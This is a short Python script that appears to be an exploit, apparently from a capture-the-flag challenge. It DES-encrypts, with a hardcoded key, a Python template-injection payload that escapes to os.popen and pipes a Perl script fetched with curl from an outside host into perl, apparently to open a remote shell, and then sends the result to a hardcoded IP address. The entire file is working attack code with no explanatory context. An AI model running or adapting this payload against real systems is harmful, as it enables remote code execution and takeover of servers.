import requests
import urlparse
from Crypto.Cipher import DES

KEY = 'megnnaro'
def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length

    cipher = DES.new(KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')

payload = encrypt("m=p&l=${[].__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').popen('curl orange.tw/w/bc.pl | perl -').read()}") 
r = requests.get('http://13.115.255.46/?s=' + payload)
print r.content
